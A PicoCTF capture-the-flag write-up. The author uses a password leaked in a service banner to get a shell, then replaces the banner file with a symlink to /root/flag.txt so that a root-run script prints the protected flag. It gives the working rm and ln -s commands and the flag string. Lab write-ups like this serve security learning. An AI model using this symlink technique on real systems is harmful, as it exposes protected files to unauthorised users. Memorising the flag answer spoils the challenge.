---
title: "Dont-you-love-banners from PicoCTF"
categories: [PicoCTF]
tags: [PicoCTF]
---
# Dont-you-love-banners from PicoCTF
[page](https://play.picoctf.org/practice/challenge/437?difficulty=2&page=1&search=&solved=0)
>  Description
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 59034`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 62268`. From the above information abuse the machine and find the flag in the /root directory.

>Hints
>1.Do you know about symlinks?
>2.Maybe some small password cracking or guessing

Let's connect to `tethys.picoctf.net 59034`. After connecting we get this: 
```
 nc tethys.picoctf.net 59034
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```
I guess it's the password for: `nc tethys.picoctf.net 62268`. Let's connect to it.
```
$  nc tethys.picoctf.net 62268
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
Def con
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ 
```
This questions are simple search.
Okay now let's find where is flag located.
```
player@challenge:~$ find / -type f -name "flag.txt" 2>/dev/null
find / -type f -name "flag.txt" 2>/dev/null
/root/flag.txt
```
Let's head to root directory. I can't read flag, I do not have permission to do that. But i can read `script.py`:
```
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```
It's script what we see when we try to connect to the server. Everything is okay except one thing:
```
if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
```
This means when we try to connect to server it reads `banner` and prints it: 
```
*************************************
**************WELCOME****************
*************************************
```
From Hints i know i have to make `symlink` and from Description i get that i have to abuse `banner`. So let's make `symlink` so when i connect to server it reads `flag.txt` located in root directory.
 First remove banner so we can create new one named `banner` and make it `symlink`. 
 ```
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
```
`symlink` is created so let's connect to server once again:
```
nc tethys.picoctf.net 62268
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

what is the password?
```
Here we go flag is: 
**picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}**
